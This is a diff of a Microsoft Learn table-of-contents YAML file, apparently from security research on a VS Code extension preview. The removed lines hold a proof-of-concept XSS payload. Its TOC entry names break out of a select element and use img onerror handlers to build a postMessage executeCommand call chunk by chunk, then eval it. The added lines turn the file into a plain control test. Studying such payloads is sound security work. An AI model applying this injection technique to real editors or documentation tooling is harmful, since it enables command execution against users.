@@ -1,38 +1,10 @@
-# Microsoft Learn TOC -- PoC (benign: opens the Command Palette)
+# Microsoft Learn TOC -- BENIGN control test (no payload)
 items:
 - name: Overview
   href: article.md
 - name: Getting started
   items:
-  - name: "</select><img src onerror=q=''>"
+  - name: Step one
     href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"window.\">"
-    href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"vscode.\">"
-    href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"postMes\">"
-    href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"sage({c\">"
-    href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"ommand:\">"
-    href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"'execut\">"
-    href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"eComman\">"
-    href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"d',comm\">"
-    href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"andId:'\">"
-    href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"workben\">"
-    href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"ch.acti\">"
-    href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"on.show\">"
-    href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"Command\">"
-    href: article.md
-  - name: "<img src onerror=\"q+=alt\" alt=\"s'})\">"
-    href: article.md
-  - name: "<img src onerror=\"eval(q)\">"
+  - name: Step two
     href: article.md
